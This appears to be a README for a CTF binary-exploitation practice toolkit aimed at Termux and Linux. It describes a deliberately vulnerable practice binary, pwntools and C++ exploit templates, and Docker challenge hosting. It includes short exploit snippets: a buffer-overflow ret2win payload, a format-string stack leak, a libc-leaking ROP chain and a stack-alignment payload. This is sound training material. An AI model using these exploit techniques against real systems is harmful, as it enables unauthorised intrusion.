# Pwnctf 🚀

[![License: MIT](https://shields.io)](https://opensource.org)
[![Supported OS: Termux & Linux](https://shields.io)](#)
[![Tech Stack: C++ & Python](https://shields.io)](#)

**Pwnctf** is a lightweight, all-in-one binary exploitation (Pwn) practice toolkit and development framework tailored for CTF (*Capture The Flag*) players. It is fully optimized to run natively on Termux/Android and Linux systems, and **ready for use in real CTF competitions**.

This repository provides:
- Multi-vulnerability testing binary (`vuln.cpp`) with 4 exploitation challenges (for practice)
- **Fully-featured exploit templates** that can be adapted for **real CTF challenges**
- Compiler scripts with **Android-compatible security mitigations** (no `-no-pie` on ARM64)
- Full-featured Python `pwntools` exploit templates with **Termux/ARM64 support**
- Native C++ exploitation library with dynamic symbol resolution
- Production-grade Docker deployment for CTF challenge hosting

---

## 🎯 Use Cases

### 📚 Practice Mode (Learning & Skill Building)
Use the included `vuln.cpp` binary and provided exploits to learn:
- Stack buffer overflow techniques
- Format string vulnerabilities
- ROP chain construction
- Heap exploitation (UAF)

**Perfect for:**
- CTF beginners learning binary exploitation
- Sharpening exploit development skills
- Testing new techniques before real competitions

### 🏆 Real CTF Competition Mode (Live Challenges)
Adapt the **exploit templates** and **C++ helper library** for actual CTF challenges:
- Use `exploit_template.py` as a starting point for real binaries
- Use `pwn_helper.hpp` for pure C++ exploitation
- Leverage the dynamic symbol resolution for ASLR-enabled binaries
- Deploy challenges using Docker + Socat infrastructure

**Perfect for:**
- Live CTF competitions (local, regional, international)
- Online CTF platforms (CTFd, HackTheBox, PicoCTF, etc.)
- Real-world penetration testing labs
- Binary analysis and exploitation training

---

## 📁 Repository Blueprint

```text
├── vuln.cpp                 # Multi-vulnerability practice target binary (4 bug classes)
├── build.sh                 # Compilation automation (Android Termux compatible - clang++, no -no-pie)
├── exploit_template.py      # Full-featured pwntools boilerplate for real CTF challenges
├── pwn_helper.hpp           # Header-only mini "pwntools" engine written in native C++
├── exploit.cpp              # Reference exploit written in C++ using pwn_helper.hpp
├── setup_termux.sh          # Dependency environment installer for Termux (binary wheels only)
├── Dockerfile               # Production-grade socat sandbox deployment container
├── docker-compose.yml       # Local orchestration for sandbox hosting & resource limiting
├── .gitignore               # Strict path exclusions (guards flags and binary artifacts)
└── README.md                # This file
```

---

## 🎯 Target Playground: `vuln.cpp` (Practice Binary)

The target executable implements an interactive menu specifically crafted to simulate four major architectural software security vulnerabilities for progressive training:

1. **Stack Buffer Overflow:** Uses an unbounded string processing function (`unsafe_gets`) to easily trigger instruction pointer overwrites.
2. **Format String Vulnerability:** Passes raw runtime user inputs directly into `printf()` without a structural format specifier (`%s`), enabling arbitrary memory leaks and pointer writes.
3. **Integer Overflow to Heap Overflow:** Forces mathematical signed integer limits to bypass size constraint verifications, creating an asymmetric buffer limit for heap memory allocations.
4. **Use-After-Free (UAF):** Preserves dangling references to a cluster memory block after executing a `free()` call, enabling post-deallocation data manipulation.

---

## 🚀 Quick Start Guide (Termux Android Native)

### 1. Environment Deployment (Android Termux)

Initialize the development toolkit with Termux-optimized dependencies (**binary wheels only** to prevent compilation errors):

```bash
chmod +x setup_termux.sh build.sh
./setup_termux.sh          # Installs clang, gdb, python3, pwntools (binary wheels), ropgadget, ropper
./build.sh                 # Compiles vuln.cpp into FOUR tiers (Android/ARM64 compatible)
```

**What `setup_termux.sh` does:**
- Updates Termux package manager
- Installs core compilation toolchain (clang, binutils)
- **Upgrades pip for binary wheel support** (critical for psutil compatibility)
- **Installs pwntools with `--only-binary :all:`** (prevents "platform android not supported" error)
- Installs ROPgadget and ropper for gadget hunting
- Installs tmux for GDB debugging support
- Provides installation verification checklist

**Binary Tiers Generated (Termux Android):**
- `vuln_easy` — No stack canary, execstack enabled (baseline exploitation)
- `vuln_nopie` — No stack canary (intermediate difficulty)
- `vuln_canary` — Stack canary enabled (moderate protection)
- `vuln_full` — Full hardening protections (PIE+canary+NX on ARM64)

Verify protections:
```bash
checksec --file=vuln_easy
checksec --file=vuln_full
```

### 2. Interactive GDB Debugging on Termux (TMUX Required)

Run exploit with automatic GDB attachment in split tmux window:

```bash
# First, start tmux session (only once per session)
tmux new-session -d -s work

# Then run exploit with GDB mode
python3 exploit_template.py gdb
```

The template auto-detects TMUX environment and opens GDB in a right-split window for real-time debugging on ARM64 Android.

### 3. Local Process Execution

Attack the local binary without debugging:

```bash
python3 exploit_template.py          # Default: local process mode
```

### 4. Remote Server Exploitation (Real CTF)

Connect to a remote CTF challenge server:

```bash
python3 exploit_template.py remote   # Connects to HOST:PORT configured in script
```

Edit `exploit_template.py` to change `HOST` and `PORT` for your specific CTF challenge.

### 5. Pure C++ Exploitation (No Python)

Compile and run the native C++ exploit:

```bash
# Compile (Termux uses clang++ via g++ alias)
clang++ -std=c++17 -o exploit exploit.cpp

# Local attack
./exploit

# Remote attack against CTF server
./exploit remote 127.0.0.1 1337
```

---

## 🛠️ Real CTF Workflow: Adapt Templates for Your Challenge

### Step 1: Receive Challenge Binary
When you get a CTF challenge binary (e.g., `pwn_challenge`):

```bash
# Analyze it
checksec --file=pwn_challenge
file pwn_challenge
strings pwn_challenge | head -20
```

### Step 2: Copy and Modify exploit_template.py
```bash
cp exploit_template.py my_exploit.py
```

Edit `my_exploit.py`:
```python
BINARY = "./pwn_challenge"    # Your actual binary
HOST = "ctf.example.com"      # Real CTF server
PORT = 9999                    # Real CTF port
LIBC = "./libc.so.6"          # If provided with challenge
```

### Step 3: Find Vulnerabilities
Use the provided helper functions:

```python
# Find buffer offset interactively
offset = find_offset_cyclic()

# Leak addresses from format strings
addr = leak_addr(io, b"Your prompt: ", "leaked_value")

# Build ROP chains
exploit_ret2libc()
```

### Step 4: Test Locally First
```bash
# Test against the provided binary
python my_exploit.py

# Debug with GDB if needed
python my_exploit.py gdb
```

### Step 5: Connect to Real CTF Server
```bash
python my_exploit.py remote
```

If successful, you'll get the flag! 🚩

---

## 📋 Real CTF Examples

### Example 1: Simple Buffer Overflow (pwn.college, picoCTF)
```python
# my_exploit.py
def exploit_real_ctf():
    io = start()  # Connects to remote server
    
    OFFSET = 64  # Find this via cyclic
    win_addr = elf.symbols['flag']  # Or any function that prints flag
    
    io.sendlineafter(b'Enter input: ', b'A' * OFFSET + elf.pack(win_addr))
    io.interactive()

exploit_real_ctf()
```

### Example 2: Format String Leak (Intermediate Challenge)
```python
# my_exploit.py
def exploit_real_ctf():
    io = start()
    
    # Leak stack to find format string offset
    for i in range(1, 30):
        payload = f"%{i}$p".encode()
        io.sendline(payload)
        log.info(f"[%{i}$p] = {io.recvline()}")
    
    io.interactive()
```

### Example 3: ROP Chain + Shellcode (Advanced Challenge)
```python
# my_exploit.py
def exploit_real_ctf():
    io = start()
    rop = ROP(elf)
    
    # Leak libc base via GOT
    payload = flat(
        b'A' * OFFSET,
        elf.pack(rop.find_gadget(['pop rdi', 'ret'])[0]),
        elf.pack(elf.got['puts']),
        elf.pack(elf.plt['puts']),
        elf.pack(elf.symbols['main']),
    )
    
    io.sendline(payload)
    leaked_puts = leak_addr(io, b'> ', 'puts')
    
    # Calculate system() address and call it
    libc.address = leaked_puts - libc.symbols['puts']
    io.interactive()
```

---

## 🛠️ Exploit Developer References

### Python Template Configuration (`exploit_template.py`) — Termux Optimized

The framework provides **full-featured exploitation routines** with Termux/Android support:

```python
# Termux GDB Integration (auto-detects TMUX)
if "TMUX" in os.environ:
    context.terminal = ['tmux', 'splitw', '-h']

# Architecture-agnostic packing (works on ARM64 & x86_64)
context.binary = elf = ELF("./vuln_easy", checksec=False)
context.log_level = "info"

def start():
    if args.REMOTE or "remote" in sys.argv:
        return remote(HOST, PORT)  # REAL CTF SERVER
    elif args.GDB or "gdb" in sys.argv:
        return gdb.debug([BINARY], gdbscript=GDB_SCRIPT)
    return process([BINARY])  # LOCAL TESTING
```

**Built-in Helpers (Termux-Compatible):**

| Function | Purpose | Real CTF Use |
| :--- | :--- | :--- |
| `exploit_stack_overflow()` | ret2win attack with dynamic symbol resolution | ✅ Direct adaptation |
| `exploit_format_string()` | Format string leak & write automation | ✅ Direct adaptation |
| `exploit_ret2libc()` | ROP chain construction + system("/bin/sh") | ✅ Direct adaptation |
| `leak_addr(io, prompt, label)` | Extract leaked addresses | ✅ Use in your exploit |
| `find_offset_cyclic(pattern_length)` | Interactive offset discovery with manual input | ✅ Find your offset |

**Example: Real CTF Adaptation**
```python
# Start with template, customize for your binary
offset = find_offset_cyclic()  # Find buffer offset
exploit_stack_overflow()       # Or adapt for your challenge
```

### C++ Helper Engine Architecture (`pwn_helper.hpp`)

A modular `namespace pwn` abstraction built purely upon POSIX system calls (`poll`, `fork`, `pipe`, `socket`) to execute stable exploit flows natively within C++. Works on ARM64 and x86_64 architectures. **Perfect for real CTF challenges** requiring pure C++ exploitation.

#### Data Packaging & Manipulation (Little Endian)
* `pwn::p32(uint32_t v)` / `pwn::p64(uint64_t v)` – Serializes integers into little-endian byte streams (auto-sized for architecture).
* `pwn::u32(string s)` / `pwn::u64(string s)` – Deserializes little-endian byte inputs into integers.
* `pwn::cyclic(size_t length)` – Generates low-collision sequences to compute memory buffer crash offsets.

#### The `pwn::Tube` Connection Handler

| Method Wrapper | Underlying Subsystem / Behavior | Real CTF Support |
| :--- | :--- | :--- |
| `connect_remote(host, port)` | Establishes a remote socket interface connection (`getaddrinfo` / `connect`). | ✅ Connect to CTF servers |
| `spawn_local(path)` | Spawns a local execution binary child process over managed IPC communication pipes (`fork` / `dup2` / `execl`). | ✅ Local testing |
| `send(data)` / `sendline(data)` | Writes raw string structures directly to the outgoing target input file descriptor. | ✅ Send exploits |
| `recv(n)` | Reads a stream containing up to `n` data bytes from the input descriptor. | ✅ Receive responses |
| `recvuntil(delim)` | Progressively polls single-byte structures until matching a specified delimiter. | ✅ Parse output |
| `interactive()` | Handshakes I/O operations between standard paths using persistent multiplexing (`poll`). | ✅ Get shell access |

---

## ⚠️ Critical Architectural Gotcha: Stack Alignment

During local execution testing of this framework, an essential architectural behavior was verified regarding x86_64 Calling Conventions and `system()` calls (also applies to ARM64):

When overwriting a saved return pointer directly to a `win()` or shell-spawning function, **the stack pointer (RSP/SP) can become misaligned** compared to a standard branch sequence initialization.

* **The Symptom:** The target execution transfers successfully (e.g., standard print logs execute), but nested routines like `system("/bin/sh")` will silently drop input context or crash inside libc.
* **The Remediating Fix:** Always introduce an empty standalone `ret` instruction gadget into your ROP string array *prior* to injecting the target execution address. This increments the stack pointer and re-aligns it.

```python
# Rectifying stack parity before calling system()
payload = b"A" * OFFSET
payload += elf.pack(ret_gadget)   # Pad stack pointer alignment (Mandatory)
payload += elf.pack(win_addr)     # Transfer execution flow cleanly
```

**Note on Android/ARM64:** ARM64 has different stack alignment requirements than x86_64 (16-byte vs 8-byte). The template and `exploit.cpp` use dynamic symbol resolution and `elf.pack()` to handle architecture-specific packing automatically. The build script (`build.sh`) and exploit code work transparently on both architectures.

---

## 🐳 Isolated Server Deployment (Docker + Socat)

The repository provides production-grade deployment tools mirroring contemporary CTF event hosting standards (such as CTFd and pwn.college) to isolate applications within restricted security sandboxes.

**Use cases:**
- Host practice challenges locally for your team
- Deploy challenges to public CTF events
- Create your own CTF competition
- Test exploits against realistic challenge environments

### Testing the Sandbox Infrastructure Locally (Linux)

Spin up an isolated container cluster using Docker Compose:
```bash
docker compose up --build
```

In an external alternate console shell, establish your pipeline network connection using standard Netcat tools:
```bash
nc localhost 1337
```

### Production Deployment Strategy

Build your target stack using runtime environment build arguments to inject dynamic infrastructure flags without persistent tracking:
```bash
docker build --build-arg FLAG="CTF{your_real_secret_flag}" -t pwn-challenge .
```

Deploy the isolated challenge background daemon with explicit memory allocations, cpu quotas, and active processing resource boundaries to prevent fork-bomb or DoS stability issues:
```bash
docker run -d -p 1337:1337 --restart unless-stopped \
  --memory=256m --pids-limit=50 --cpus=0.5 \
  pwn-challenge
```

Connect from your Termux/Laptop exploit:
```bash
python my_exploit.py remote    # HOST=ctf.example.com, PORT=1337
```

### 🔒 Operational Security Compliance Checkpoints
1. **Repository Hygiene:** The configuration maps path rules inside `.gitignore` to prevent tracking runtime secrets, environment configurations, and artifacts (`flag.txt`, `.env`, core dumps).
2. **Privilege Isolation:** The Docker build uses explicit `USER ctf` separation structures to prevent arbitrary root shell escalation if underlying software flaws are exploited.
3. **Build Arguments:** Always utilize `--build-arg FLAG=...` during runtime builds to prevent saving the true target flag into your public repository cache history.

---

## 🔧 Termux-Specific Notes & Features

### Binary Wheel Installation (No Compilation Errors)

**What changed:** The original setup tried to compile `psutil` from source, which fails on Android because psutil requires Linux interfaces not available on Android.

**Solution:** `setup_termux.sh` now uses `pip install --only-binary :all: pwntools` to force installation of pre-compiled binary wheels.

**Result:** ✅ Zero "platform android is not supported" errors

### Why No `-no-pie`?

Android enforces **Position Independent Executable (PIE)** at the OS level (required for all ARM64 binaries). The updated `build.sh` uses `clang++` (Termux's native compiler) and **does NOT use `-no-pie`** flags. Instead, it relies on architecture-agnostic compilation flags (`-fstack-protector*`) that are fully compatible with ARM64 PIE binaries.

### GDB on Termux

Use TMUX for debugging split windows:
```bash
# Install tmux (one-time)
pkg install tmux

# Start a tmux session
tmux new-session -d -s work

# Run exploit with GDB (opens in split window)
python3 exploit_template.py gdb
```

**Note:** GDB runs natively on ARM64 Termux with full breakpoint and symbol support.

### Binary Compatibility

All generated binaries run natively on ARM64 Android devices without cross-compilation. The `build.sh` automatically detects your architecture and compiles for it.

### Architecture Detection

The `exploit_template.py` and `exploit.cpp` automatically detect your architecture (ARM64 or x86_64) and adjust:
- Pointer packing (p32 vs p64)
- Gadget search patterns
- Stack alignment logic
- Register naming in GDB output

### Optional: pwninit (Rust-based tool)

**Status:** Available but optional. The `setup_termux.sh` will try to install it, but if `cargo` is unavailable on your Termux setup, it gracefully skips it.

```bash
# If you want to use pwninit for binary setup:
cargo install pwninit
```

**What pwninit does:** Auto-extracts symbols, libc, and generates exploit templates from binary+libc pairs. Not required for this toolkit but useful for CTF challenges that provide libc.so.

---

## ✅ Feature Compatibility Matrix

| Feature | Termux ARM64 | Linux x86_64 | Real CTF Ready |
| :--- | :--- | :--- | :--- |
| Binary compilation | ✅ | ✅ | ✅ |
| Python exploits | ✅ | ✅ | ✅ Yes |
| C++ exploits | ✅ | ✅ | ✅ Yes |
| GDB debugging | ✅ | ✅ | ✅ Yes |
| Remote CTF connection | ✅ | ✅ | ✅ **Yes - Primary use** |
| Format string exploit | ✅ | ✅ | ✅ Yes |
| ROP gadget search | ✅ | ✅ | ✅ Yes |
| Docker deployment | ❌ | ✅ | ✅ Yes (server-side) |
| pwninit (optional) | ⚠️ | ✅ | ✅ Optional |
| ROPgadget | ✅ | ✅ | ✅ Yes |
| Ropper | ✅ | ✅ | ✅ Yes |
| Dynamic symbol resolution | ✅ | ✅ | ✅ **Yes - ASLR ready** |

---

## 📋 Installation Troubleshooting

### psutil Compilation Error
**Error:** `platform android is not supported`

**Solution:** Already fixed in `setup_termux.sh` via `--only-binary :all:`. If you see this, ensure:
```bash
pip install --upgrade pip setuptools wheel
pip install --only-binary :all: psutil pwntools
```

### GDB Not Attaching
**Error:** GDB doesn't split window or attach

**Solution:** Ensure tmux is running:
```bash
pkg install tmux
tmux new-session -d -s work
python3 exploit_template.py gdb  # Now it should work
```

### Binary Permission Denied
**Error:** `Permission denied: './vuln_easy'`

**Solution:** Make build script executable:
```bash
chmod +x build.sh
./build.sh
```

### checksec Not Found
**Error:** `checksec: command not found`

**Solution:** It's part of pwntools but may not be in PATH:
```bash
python -m pwntools.checksec ./vuln_easy
# Or install via pip:
pip install checksec
```

### Remote Connection Fails
**Error:** `Connection refused` or `Timeout`

**Solution:** Verify CTF server details:
```python
# In exploit_template.py
HOST = "ctf.example.com"  # Check spelling
PORT = 1337               # Verify port number
timeout = 10              # Add timeout context
```

---

## 🎓 Learning & CTF Competition Path

### Phase 1: Practice (Build Skills) 📚
1. **Start with `vuln_easy`**
   - Learn basic buffer overflow
   - Master `exploit_stack_overflow()`
   
2. **Move to `vuln_canary`**
   - Understand stack canary bypass
   - Learn format strings with `exploit_format_string()`
   
3. **Tackle `vuln_full`**
   - Learn ROP chains with `exploit_ret2libc()`
   - Understand ASLR and address leaking
   
4. **Study `vuln.cpp` source**
   - Understand vulnerability mechanics
   - Learn defensive programming

### Phase 2: Real CTF (Compete) 🏆
1. **Easy Challenges (pwn.college Dojo, picoCTF)**
   - Adapt `exploit_template.py`
   - Use provided helpers as-is
   
2. **Intermediate Challenges (CTFd, HackTheBox)**
   - Modify templates for custom binaries
   - Learn challenge-specific quirks
   
3. **Hard Challenges (Advanced CTFs)**
   - Combine multiple techniques
   - Use `pwn_helper.hpp` for complex flows
   - Deploy Docker challenges

---

## 🏁 Quick CTF Competition Checklist

- [ ] `./setup_termux.sh` (one-time setup)
- [ ] Receive CTF binary
- [ ] `checksec --file=<binary>` (check protections)
- [ ] `cp exploit_template.py my_exploit.py`
- [ ] Identify vulnerability type
- [ ] Adapt exploit for your binary
- [ ] Test locally: `python my_exploit.py`
- [ ] Debug with GDB if needed: `python my_exploit.py gdb`
- [ ] Connect to CTF server: `python my_exploit.py remote`
- [ ] Get flag! 🚩

---

Maintained and Developed 💻 By Yashocked 🚀

**Last Updated:** 2026-07-18 | **Fully Termux/Android Compatible** ✅ | **Real CTF Ready** 🏆
